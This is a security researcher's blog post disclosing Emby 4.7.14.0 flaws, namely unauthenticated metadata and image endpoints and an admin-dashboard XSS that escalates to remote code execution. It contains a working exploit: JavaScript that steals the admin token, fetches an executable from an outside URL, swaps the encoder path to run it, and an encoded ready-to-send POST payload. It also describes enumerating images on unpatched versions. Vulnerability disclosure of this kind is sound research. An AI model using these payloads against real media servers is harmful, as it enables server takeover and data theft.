+++
title = "Take Your Media Anywhere With Emby"
author = ["Frederic Linn"]
draft = true
+++

After the last two articles, I've said to myself: Why always go after `Jellyfin`? Why not go back to where it all began, the [fork](https://jellyfin.org/docs/general/about#why-did-you-fork) from `Emby`. I wanted to know just how much DNA both projects share these days and was curious if my knowledge of the former proved to be useful.

Ultimately, it _was_ useful, because I've found three vulnerabilities in version `4.7.14.0`:

-   An unauthenticated endpoint for retrieving meta data of potentially every item in the library (full paths, identifiers etc).
-   An unauthenticated endpoint for retrieving every image of the library.
-   A `Cross-site sripting` (`XSS`) vulnerability in the admin dashboard that leads to remote code execution (`RCE`). Can be triggered by a low-privileged user.

The issues themselves don't merit a full-blown article, which is why I'm simply including my initial short report to the vendor almost verbatim. It contains a fully commented exploit for the `XSS` issue.


### I Want to Write Exploits, Not Emails {#i-want-to-write-exploits-not-emails}

Speaking about the vendor:

Unfortunately, they were (and still are) very unresponsive. I've first contacted them privately on the 12th of December 2023 with the full details. After following up two times, I've received a one-liner that didn't answer any of my questions.

Look, I'm not suddenly part of the team because I've informed them of those vulnerabilities. I'm not asking for briefings about every internal detail. I simply wanted a rough timeline for coordinating the release of this article so that no information is available before any of those 23.500 reachable instances&nbsp;[^fn:1] had a chance to get patched.

My last attempt at getting any kind of feedback was opening an [issue](https://web.archive.org/web/20240408111708/https://github.com/EmbySupport/security/issues/1) in their support GitHub repository.

Something to keep in mind with all of this: `Emby` is not an open source project run by volunteers! They offer [paid](https://emby.media/premiere.html) subscriptions, which incidentally is one of the reasons why the `Jellyfin` team decided to fork.

All in all, not a good look. Especially after last year's [incident](https://www.bleepingcomputer.com/news/security/emby-shuts-down-user-media-servers-hacked-in-recent-attack/).&nbsp;[^fn:2]

Now for the interesting parts: My initial report followed by some testing I did with the newest available version.


### Report {#report}


#### SuggestionsService {#suggestionsservice}

The `SuggestionsService` endpoint can be used without authentication. Only a user id is needed. Because those start at 1, it's trivial to guess a correct one.

```txt
 https://<hostname:port>/emby/Users/1/Suggestions
```

Without any additional filters via query parameters, it seems that meta data of _every_ item in the library gets returned. This data contains sensitive information like paths and names. An attacker could use the ids to further leak data from other endpoints.


#### ImageService {#imageservice}

Most of the `ImageService` endpoints don't require authentication. An interesting one is

```txt
 https://<hostname:port>/emby/Items/<itemId>/Images/Primary
```

which lets an attacker download any image from the `Emby` instance. In combination with the `SuggestionsService`, the image id doesn't even have to be guessed. But because ids in `Emby` are sequential anyway, they _could_ be.


#### Remote Code Execution through XSS in Admin Dashboard {#remote-code-execution-through-xss-in-admin-dashboard}

A malicious user can send an authentication request with a manipulated `X-Emby-Client` value, which gets added to the devices section of the admin dashboard without sanitization.

Here's a small payload to verify the `XSS`:

```txt { linenos=true, linenostart=1 }
POST https://<hostname:port>/emby/Users/authenticatebyname?X-Emby-Client=%3Cimg%20src=%22x%22%20onerror=%22eval('console.warn(document.domain)')%22%20/%3E&X-Emby-Device-Id=13371337-1337-1337-1337-133713371337&X-Emby-Client-Version=4.7.14.0
Content-Type: application/json

{
  "Username": "username",
  "Pw": "password"
}
```

Because the `JavaScript` gets executed in the context of an administrator, every service endpoint is usable for an attacker.

Here's an exploit that executes an attacker controlled executable downloaded from the Internet:

```js { linenos=true, linenostart=1 }
(async function() {
    console.warn(
        `%c
 ___
(_  _  /   _        _
/__//)()(/(/(/()(/_)
        /_/
               -- GEBIRGE (2023)
`, "color: #d33682");

    const token = JSON.parse(localStorage.servercredentials3).Servers[0].AccessToken;

    const baseHeaders = {
        "X-Emby-Token": token,
    };

    // Retrieve some information in order to construct an unsuspicious path for our executable.
    let response = await fetch("/System/Info", {
        headers: baseHeaders,
    });

    const tempPath = (await response.json()).TranscodingTempPath;
    const fakeEncoderName = "ffmpeg_backup.exe";
    const fakeEncoderFolder = "ffmpeg_backup";

    // The .jpg extension gets added automatically for camera uploads with Content-Type: application/octet-stream.
    const customEncoderPath = `${tempPath}\\${fakeEncoderFolder}\\${fakeEncoderName}.jpg`;

    // Change the camera upload path to a known location so that we can use it as the new encoder path.
    const configurationOptions = {
        CameraUploadPath: tempPath,
    };

    await fetch("/System/Configuration/devices", {
        method: "POST",
        headers: baseHeaders,
        body: JSON.stringify(configurationOptions)
    });

    // Download the executable from an outside source and drop it on the server with the camera upload functionality.
    // This needs to be done before changing the encoder path, because a file check is made.
    const blob = await (await fetch("http://localhost:8000/rofl.exe")).blob();

    await fetch(`/Devices/CameraUploads?Album=${fakeEncoderFolder}&Name=${fakeEncoderName}&Id=1`, {
        method: "POST",
        headers: baseHeaders,
        body: blob
    });

    // Remember the original encoder path so that we can reset it later.
    response = await fetch("/Encoding/FfmpegOptions", {
        headers: baseHeaders,
    });

    const currentEncoderPath = (await response.json()).Object.OriginalEncoderPath;

    // Set the encoder path to our previously dropped executable.
    const ffmpegOptions = {
        "CustomEncoderPath": customEncoderPath,
        "UseCustomEncoderPath": true
    };

    response = await fetch("/Encoding/FfmpegOptions", {
        method: "POST",
        headers: baseHeaders,
        body: JSON.stringify(ffmpegOptions)
    });

    // Retrieve some random video and request a stream of it.
    // Because we specifiy the 'avi' container, this involves an encoding step, which triggers the executable -> RCE.
    response = await fetch("/Items?Recursive=true&IncludeItemTypes=Video&Limit=1", {
        headers: baseHeaders,
    });

    const videoId = (await response.json()).Items[0].Id;

    await fetch(`/Videos/${videoId}/stream.avi`, {
        headers: baseHeaders,
    });

    // Reset the encoder path.
    const revertedFfmpegOptions = {
        "CustomEncoderPath": currentEncoderPath,
        "UseCustomEncoderPath": false,
    };

    await fetch("/Encoding/FfmpegOptions", {
        method: "POST",
        headers: baseHeaders,
        body: JSON.stringify(revertedFfmpegOptions)
    });

    // TODO: Restart the server so that the plugin gets loaded.
    // TODO: Clean-up the uploads etc.
})()
```

This is the POST request after minimizing and encoding. We use `String.fromCharCode()` so that we don't need to mess with quotation marks:

```txt { linenos=true, linenostart=1 }
POST https://<hostname:port>/emby/Users/authenticatebyname?X-Emby-Client=%3Cimg%20src=%22x%22%20onerror=%22eval(String.fromCharCode(33,97,115,121,110,99,32,102,117,110,99,116,105,111,110,40,41,123,99,111,110,115,111,108,101,46,119,97,114,110,40,34,37,99,92,110,32,95,95,95,92,110,40,95,32,32,95,32,32,47,32,32,32,95,32,32,32,32,32,32,32,32,95,92,110,47,95,95,47,47,41,40,41,40,47,40,47,40,47,40,41,40,47,95,41,92,110,32,32,32,32,32,32,32,32,47,95,47,92,110,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,45,45,32,71,69,66,73,82,71,69,32,40,50,48,50,51,41,92,110,34,44,34,99,111,108,111,114,58,32,35,100,51,51,54,56,50,34,41,59,99,111,110,115,116,32,101,61,123,34,88,45,69,109,98,121,45,84,111,107,101,110,34,58,74,83,79,78,46,112,97,114,115,101,40,108,111,99,97,108,83,116,111,114,97,103,101,46,115,101,114,118,101,114,99,114,101,100,101,110,116,105,97,108,115,51,41,46,83,101,114,118,101,114,115,91,48,93,46,65,99,99,101,115,115,84,111,107,101,110,125,59,108,101,116,32,116,61,97,119,97,105,116,32,102,101,116,99,104,40,34,47,83,121,115,116,101,109,47,73,110,102,111,34,44,123,104,101,97,100,101,114,115,58,101,125,41,59,99,111,110,115,116,32,97,61,40,97,119,97,105,116,32,116,46,106,115,111,110,40,41,41,46,84,114,97,110,115,99,111,100,105,110,103,84,101,109,112,80,97,116,104,44,111,61,34,102,102,109,112,101,103,95,98,97,99,107,117,112,46,101,120,101,34,44,115,61,34,102,102,109,112,101,103,95,98,97,99,107,117,112,34,44,110,61,96,36,123,97,125,92,92,36,123,115,125,92,92,36,123,111,125,46,106,112,103,96,44,99,61,123,67,97,109,101,114,97,85,112,108,111,97,100,80,97,116,104,58,97,125,59,97,119,97,105,116,32,102,101,116,99,104,40,34,47,83,121,115,116,101,109,47,67,111,110,102,105,103,117,114,97,116,105,111,110,47,100,101,118,105,99,101,115,34,44,123,109,101,116,104,111,100,58,34,80,79,83,84,34,44,104,101,97,100,101,114,115,58,101,44,98,111,100,121,58,74,83,79,78,46,115,116,114,105,110,103,105,102,121,40,99,41,125,41,59,99,111,110,115,116,32,105,61,97,119,97,105,116,40,97,119,97,105,116,32,102,101,116,99,104,40,34,104,116,116,112,58,47,47,108,111,99,97,108,104,111,115,116,58,56,48,48,48,47,114,111,102,108,46,101,120,101,34,41,41,46,98,108,111,98,40,41,59,97,119,97,105,116,32,102,101,116,99,104,40,96,47,68,101,118,105,99,101,115,47,67,97,109,101,114,97,85,112,108,111,97,100,115,63,65,108,98,117,109,61,36,123,115,125,38,78,97,109,101,61,36,123,111,125,38,73,100,61,49,96,44,123,109,101,116,104,111,100,58,34,80,79,83,84,34,44,104,101,97,100,101,114,115,58,101,44,98,111,100,121,58,105,125,41,44,116,61,97,119,97,105,116,32,102,101,116,99,104,40,34,47,69,110,99,111,100,105,110,103,47,70,102,109,112,101,103,79,112,116,105,111,110,115,34,44,123,104,101,97,100,101,114,115,58,101,125,41,59,99,111,110,115,116,32,100,61,40,97,119,97,105,116,32,116,46,106,115,111,110,40,41,41,46,79,98,106,101,99,116,46,79,114,105,103,105,110,97,108,69,110,99,111,100,101,114,80,97,116,104,44,114,61,123,67,117,115,116,111,109,69,110,99,111,100,101,114,80,97,116,104,58,110,44,85,115,101,67,117,115,116,111,109,69,110,99,111,100,101,114,80,97,116,104,58,33,48,125,59,116,61,97,119,97,105,116,32,102,101,116,99,104,40,34,47,69,110,99,111,100,105,110,103,47,70,102,109,112,101,103,79,112,116,105,111,110,115,34,44,123,109,101,116,104,111,100,58,34,80,79,83,84,34,44,104,101,97,100,101,114,115,58,101,44,98,111,100,121,58,74,83,79,78,46,115,116,114,105,110,103,105,102,121,40,114,41,125,41,44,116,61,97,119,97,105,116,32,102,101,116,99,104,40,34,47,73,116,101,109,115,63,82,101,99,117,114,115,105,118,101,61,116,114,117,101,38,73,110,99,108,117,100,101,73,116,101,109,84,121,112,101,115,61,86,105,100,101,111,38,76,105,109,105,116,61,49,34,44,123,104,101,97,100,101,114,115,58,101,125,41,59,99,111,110,115,116,32,104,61,40,97,119,97,105,116,32,116,46,106,115,111,110,40,41,41,46,73,116,101,109,115,91,48,93,46,73,100,59,97,119,97,105,116,32,102,101,116,99,104,40,96,47,86,105,100,101,111,115,47,36,123,104,125,47,115,116,114,101,97,109,46,97,118,105,96,44,123,104,101,97,100,101,114,115,58,101,125,41,59,99,111,110,115,116,32,109,61,123,67,117,115,116,111,109,69,110,99,111,100,101,114,80,97,116,104,58,100,44,85,115,101,67,117,115,116,111,109,69,110,99,111,100,101,114,80,97,116,104,58,33,49,125,59,97,119,97,105,116,32,102,101,116,99,104,40,34,47,69,110,99,111,100,105,110,103,47,70,102,109,112,101,103,79,112,116,105,111,110,115,34,44,123,109,101,116,104,111,100,58,34,80,79,83,84,34,44,104,101,97,100,101,114,115,58,101,44,98,111,100,121,58,74,83,79,78,46,115,116,114,105,110,103,105,102,121,40,109,41,125,41,125,40,41,59))%22%20/%3E&X-Emby-Device-Id=13371337-1337-1337-1337-133713371337&X-Emby-Client-Version=4.7.14.0

Content-Type: application/json

{
  "Username": "username",
  "Pw": "password"
}
```

The fake encoder executable could drop a plugin `DLL` in order to gain persistent access to the `Emby` instance.

An almost identical vulnerability was present in `Jellyfin`. I've written about it [here](https://gebir.ge/blog/peanut-butter-jellyfin-time/).


#### Summary {#summary}

Unauthenticated attackers can retrieve a lot of valuable information from the outside through the `SuggestionsService`. They can then retrieve every image of an instance. There are probably other attacks for which this information proves to be essential.

It doesn't _really_ matter, though, because `Emby's` id system makes use of [insecure direct object references](https://en.wikipedia.org/wiki/Insecure_direct_object_reference). An attacker could simply enumerate lots of ids until they find images.

Furthermore, malicious users can trigger `JavaScript` execution in an admin context in order to gain remote code execution on the `Emby` instance.

All research was done on version `4.7.14.0`.

_(End of report)_


### What is Fixed in 4.8.3.0? {#what-is-fixed-in-4-dot-8-dot-3-dot-0}

Because the vendor isn't responding, I wanted to do at least some light testing with the newest available version before releasing the full details.
But please: **Don't just take my word for it!**

Firstly, the `SuggestionsService` endpoint requires authentication now. I haven't tested if it's scoped to the user making the request, though.

Secondly, the initial `XSS` vulnerability in the admin dashboard seems to be fixed, too. I doubt that the underlying technique of switching the encoder binary in order to gain remote code execution was fixed.[^fn:3]

Here's the relevant part of the Document Object Model (DOM) before the fix:

{{< figure src="/take-your-media-anywhere-with-emby_devices-dom-before.png" caption="<span class=\"figure-number\">Figure 1: </span>An image of the DOM before the fix." >}}

And here is one after the fix:

{{< figure src="/take-your-media-anywhere-with-emby_devices-dom-after.png" caption="<span class=\"figure-number\">Figure 2: </span>An image of the DOM after the fix." >}}

And lastly, **the `ImageService` endpoint still does not require authentication**! Removing the ability to simply retrieve the image ids via the `SuggestionsController` does make the process a bit more cumbersome, but it's still trivial:

Ids are sequential, so we simply need a loop that requests `emby/Items/<i++>/Images/Primary`. `Emby` is kind enough to provide clear error messages. Either an item is not an image, or the requested id has not been assigned yet. A nice exit condition for the loop.

<video controls preload="metadata"><source src="/take-your-media-anywhere-with-emby_vulnerable-image-endpoint.mp4" type="video/mp4">
Your browser does not support the video tag.</video>


### Conclusion {#conclusion}

Looking at two projects with a common history but enough divergence today was a lot of fun. `Jellyfin's` decision of using [UUIDs](https://en.wikipedia.org/wiki/Universally_unique_identifier) instead of ascending integers for identifiers might have the most impact. If we could somehow combine last year's [argument injection](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-49096) in `Jellyfin` with the id system or `SuggestionsService` of `Emby`, we'd be in unauthenticated `RCE` heaven!

The vulnerabilities highlighted in this article yet again show just how important a proper setup for self-hosted services is. Ideally, the login pages of the individual services should _never_ be exposed. I realize that a lot of those media servers are shared with people not well-versed in technical details. Nevertheless, there are countless guides out there dealing with this exact scenario.

Proper isolation is key, because there will always be bugs. The lesser surface exposed, the better.

As always, thank you **so** much for reading!

[^fn:1]: Last time I checked on Shodan.
[^fn:2]: The root cause was a vulnerability first reported at least three years earlier!
[^fn:3]: Jellyfin actually [did](https://jellyfin.org/posts/jellyfin-security-and-you).
